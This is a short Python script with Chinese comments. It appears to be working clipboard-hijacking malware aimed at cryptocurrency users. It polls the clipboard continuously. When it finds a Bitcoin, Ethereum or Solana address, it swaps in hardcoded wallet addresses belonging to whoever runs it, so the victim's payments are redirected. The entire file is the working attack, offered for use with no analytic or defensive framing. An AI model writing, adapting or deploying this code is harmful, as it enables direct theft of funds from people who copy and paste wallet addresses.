import re
import pyperclip
import time

# 你的钱包地址（请替换成你的真实地址）
MY_ADDRESSES = {
    "BTC": "bc1plgwt3jymuz9ywz7y6wul28xpp33uvt4gah8y3r74yj7knf33esfszqxesy",
    "ETH": "0x2efca5be62ee7701492af2e52ac26a67895d5c78",
    "SOL": "2DTkD4roAF3aAbbx3fGvwgurqVHFgr9ZQWTcytrDQ7hE",
}

# 监控的币种（"ALL" 代表监控所有）
MONITOR_COIN = "ALL"

# 不同币种的地址正则表达式
ADDRESS_PATTERNS = {
    "BTC": r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
    "ETH": r"^0x[a-fA-F0-9]{40}$",
    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{32,44}$",
}

# 记录上次处理的剪贴板内容
last_processed_clipboard = None

def detect_and_replace_address(content):
    """
    检测剪贴板内容是否是 BTC、ETH、SOL 地址，并匹配对应币种替换
    """
    global last_processed_clipboard

    # 如果内容为空，直接返回
    if not content:
        return False

    content = content.strip()
    if len(content) < 25 or len(content) > 44:
        return False

    # 遍历检查每种币种的地址格式
    for coin, pattern in ADDRESS_PATTERNS.items():
        if MONITOR_COIN != "ALL" and coin != MONITOR_COIN:
            continue

        if re.fullmatch(pattern, content):
            # 如果是自己的任何一个地址，不需要替换
            if content in MY_ADDRESSES.values():
                print(f"✅ 剪贴板已是你的地址，无需替换")
                return True

            print(f"⚠️ 发现 {coin} 地址: {content}")
            print(f"🚨 替换为你的 {coin} 地址: {MY_ADDRESSES[coin]}")
            pyperclip.copy(MY_ADDRESSES[coin])
            last_processed_clipboard = MY_ADDRESSES[coin]
            time.sleep(0.5)
            return True

    return False

def monitor_clipboard():
    """
    监听剪贴板内容，发现 BTC、ETH、SOL 地址就替换
    """
    global last_processed_clipboard
    
    last_processed_clipboard = ""  # 初始化为空字符串
    print("📋 监听启动...")
    
    while True:
        try:
            clipboard_content = pyperclip.paste().strip()
            if clipboard_content and clipboard_content != last_processed_clipboard:
                if detect_and_replace_address(clipboard_content):
                    print(f"🔄 剪贴板已更新为你的地址")
                else:
                    print(f"📋 剪贴板内容：{clipboard_content}（无匹配地址）")
                last_processed_clipboard = clipboard_content
            time.sleep(0.1)  # 缩短检查间隔，提高响应速度
        except KeyboardInterrupt:
            print("\n❌ 监控已停止")
            break

if __name__ == "__main__":
    monitor_clipboard()